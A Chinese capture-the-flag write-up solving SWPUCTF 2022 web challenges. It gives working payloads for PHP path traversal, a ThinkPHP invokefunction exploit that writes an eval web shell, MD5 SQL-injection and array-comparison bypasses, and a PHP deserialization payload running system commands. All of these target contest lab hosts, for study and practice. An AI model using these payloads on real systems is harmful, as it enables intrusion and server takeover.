# SWPUCTF 2022

## Web

### numgame

进入页面后是个文字游戏，题目为 `10+10=?` ，但是无论如何加减都不能改到 `20` 。

<figure><img src=".gitbook/assets/numgame-1.png" alt=""><figcaption></figcaption></figure>

因此开始尝试 `F12` 打开开发者工具，但是不起作用，发现右键也被禁用了。下一步直接一把梭把 JavaScript 禁用了，禁用之后打开开发者工具，可以发现 `/js/1.js` ，其内容如下

```js
var input = $('input'),
    input_val = parseInt(input.val()),
    btn_add = $('.add'),
    btn_remove = $('.remove');

input.keyup(function() {
    input_val = parseInt(input.val())
});

btn_add.click(function(e) {
    input_val++;
    input.val(input_val);
    console.log(input_val);
    if(input_val==18){
        input_val=-20;
        input.val(-20);

    }
});

btn_remove.click(function(e) {
    input_val--;
    input.val(input_val);
});
// NSSCTF{TnNTY1RmLnBocA==}
```

对 `TnNTY1RmLnBocA==` 进行 Base64 解码可以得到 `NsScTf.php` ，访问 `NsScTf.php` 可以得到以下内容

```php
<?php
error_reporting(0);
//hint: 与get相似的另一种请求协议是什么呢
include("flag.php");
class nss{
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m",$_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

通过提示可得知应该使用 `POST` 请求协议，由于 nss 类内函数 ctf 为静态函数，可以直接通过 `nss::ctf` 来调用。通过访问 `/hint2.php` 可以得知类名为 `nss2` ，因此通过构造 payload `p=nss2::ctf` 就可以得到 flag 了。

### ez\_ez\_php

```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 3) === "php" ) {
        echo "Nice!!!";
        include($_GET["file"]);
    } 

    else {
        echo "Hacker!!";
    }
}else {
    highlight_file(__FILE__);
}
//flag.php
```

Payload 如下

```
file=php/../flag.php
```

回显如下

```
Nice!!!NSSCTF{flag_is_not_here}
real_flag_is_in_'flag'
```

最终 Payload 如下

```
file=php/../flag
```

### ez\_ez\_php(revenge)

```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 3) === "php" ) {
        echo "Nice!!!";
        include($_GET["file"]);
    } 

    else {
        echo "Hacker!!";
    }
}else {
    highlight_file(__FILE__);
}
//flag.php
```

Payload 如下

```
file=php/../../../../../../flag
```

### ez\_rce

先来一波 Dirsearch

```bash
$ python dirsearch.py -u http://node1.anna.nssctf.cn:28559/
[20:22:00] 200 -   35B  - /.gitignore
[20:30:31] 200 -   18KB - /composer.lock
[20:30:31] 200 -  942B  - /composer.json
[20:39:07] 200 -   46B  - /robots.txt
[20:42:03] 200 -    0B  - /vendor/autoload.php
[20:42:04] 200 -    0B  - /vendor/composer/autoload_classmap.php
[20:42:04] 200 -    0B  - /vendor/composer/autoload_files.php
[20:42:04] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[20:42:04] 200 -    0B  - /vendor/composer/autoload_real.php
[20:42:04] 200 -    0B  - /vendor/composer/ClassLoader.php
[20:42:04] 200 -    0B  - /vendor/composer/autoload_static.php
[20:42:04] 200 -   16KB - /vendor/composer/installed.json
[20:42:04] 200 -    1KB - /vendor/composer/LICENSE
[20:42:04] 200 -    0B  - /vendor/composer/autoload_psr4.php
```

`robots.txt` 内容如下

```
User-agent: *
Disallow:
  -  /NSS/index.php/
```

访问 `/NSS/index.php` 可以得到提示 `ThinkPHP` 。

<figure><img src=".gitbook/assets/ez_rce-1.png" alt="" width="307"><figcaption></figcaption></figure>

通过 `ThinkPHP-Scan` 扫描一下。

```bash
$ python thinkphp_scan.py -url http://node1.anna.nssctf.cn:28559/NSS/index.php
[Info] > thinkphp_invoke_func_code_exec True
```

构造 Payload 如下以来传入 Shell

```
s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[1]);?>
```

通过蚁剑连接

```
http://node1.anna.nssctf.cn:28559/NSS/shell.php
```

连接后发现根目录的 `/flag` 是空的，发现 `nss` 文件夹，最后发现 flag 在 `/nss/ctf/flag/flag` 。

### 奇妙的MD5

在 Header 头可以看到 Hint 。

```
select * from 'admin' where password=md5($pass,true)
```

可以通过 `ffifdyop` 进行绕过，原因是 `ffifdyop` 经过 md5 加密后变成 `276f722736c95d99e921722cf9ed621c` ，再转换成字符串则变为 `'or'6É]é!r,ùíb` 使得以上 SQL 语句变成了如下样子。

```
select * from 'admin' where password=''or'6É]é!r,ùíb'
```

跳转后，得到源代码如下

```html
<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->
```

Payload 如下

```
x[]=1&y[]=2
```

可以得到以下代码

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
}
```

Payload 如下

```
wqh[]=1&dsy[]=2
```

就可以得到 flag 了。

### where\_am\_i

问题：什么东西是11位啊？

那就是需要找图上这个地方的电话号码。

http://www1.zmjd100.com/hotel/pc/1283140?checkIn=2023-07-26\&checkOut=2023-07-27

02886112888

### 1z\_unserialize

```php
<?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;
        $a($this->lly);
     }
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
?> 
```

构造序列化

```php
<?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;
        $a($this->lly);
     }
}
$a = new lyh();
$a->lt = 'system';
$a->lly = 'ls /';
echo serialize($a);
// O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}
?> 
```

构造 Payload 如下

```
nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:4:"ls /";}
```

回显如下

```
bin boot dev etc flag home lib lib64 media mnt opt proc root run run.sh sbin srv sys tmp usr var
```

构造 Payload 如下

```
nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
```

回显就是 flag 。
